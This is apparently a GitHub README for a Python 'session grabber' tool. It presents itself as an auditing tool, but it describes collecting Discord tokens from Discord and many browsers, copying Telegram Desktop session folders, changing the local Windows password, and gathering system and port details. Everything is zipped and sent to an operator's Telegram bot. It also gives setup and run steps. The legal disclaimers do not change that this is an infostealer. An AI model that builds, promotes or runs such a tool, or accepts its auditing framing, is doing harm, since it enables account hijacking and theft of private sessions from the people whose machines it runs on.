Windows RDP & Session Grabber Tool
(For authorized auditing, recovery, and system administration)

⚠️ Legal Notice
This tool must only be used on systems you own or have explicit permission to audit.
Unauthorized access, password modification, or session extraction on systems you do not control may be illegal.
The author is not responsible for misuse.

📌 Overview

This project is a Windows security auditing tool designed to help administrators and researchers analyze their own systems.
It can:

Check if RDP (Remote Desktop) is enabled

Attempt to change the local Windows user password (for recovery/admin use)

Back up Telegram Desktop session data (tdata)

Scan the system for Discord session tokens stored locally

Collect system info, open ports, MAC address, username, etc.

Send a full report — plus session backups — directly to a Telegram bot

This tool is useful for:

Security auditing

Monitoring RDP-exposed environments

Backing up messaging app sessions

Incident response

Local system analysis

✨ Features
🔐 RDP Security Audit

Detects if Remote Desktop Services are running

Checks if port 3389 is open

Can attempt to change the current Windows user password
(for recovery or authorized testing only)

💬 Telegram Desktop Session Backup

Locates Telegram Desktop’s tdata folder

Copies it safely into a temporary backup

Compresses into a ZIP archive

Sends the archive to your Telegram bot

🎮 Discord Local Token Scan

Searches for locally stored Discord “session tokens” from:

Discord (Stable / Canary / PTB)

Chrome

Edge

Opera / Opera GX

Brave

Yandex

Many other Chromium-based browsers

Firefox

All findings are saved to a text file and included in the ZIP backup.

🖥 System Information & Port Scan

Collects:

Username

Local IP address

MAC address

Windows version

Open ports (80, 443, 445, 135, 139, 3389)

📤 Telegram Bot Reporting

Sends:

A detailed Markdown-formatted system report

Discord token list (or summary)

Telegram session backup ZIP file

All via your Telegram bot token and chat ID

📦 Requirements

Windows OS

Python 3.x

Administrator privileges

Python packages:

requests
psutil


Install them with:

pip install requests psutil

⚙️ Configuration

At the top of the script, set:

TELEGRAM_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"


If left as defaults, the script will:

Ask you for the token and chat ID on first run

Automatically update the script file with your values

🚀 Usage

Clone the repository:

git clone https://github.com/0xMush/your-repo
cd your-repo


Install dependencies:

pip install requests psutil


Run as Administrator:

python main.py


After execution:

A system report will be generated

A ZIP containing Telegram + Discord session data (if found) will be created

Everything will be sent automatically to your Telegram bot

🔍 Intended Use Cases

RDP configuration auditing

Security monitoring for personal or lab systems

Telegram Desktop session backup

Discord session storage analysis

Incident response in authorized environments

Windows forensic research

🚫 What This Tool Must NOT Be Used For

Unauthorized access to machines

Stealing accounts or sessions

Password manipulation on systems you do not own

Any illegal activity

🧑‍💻 Author

Mushaib (aka Mrexe)
GitHub: 0xMush
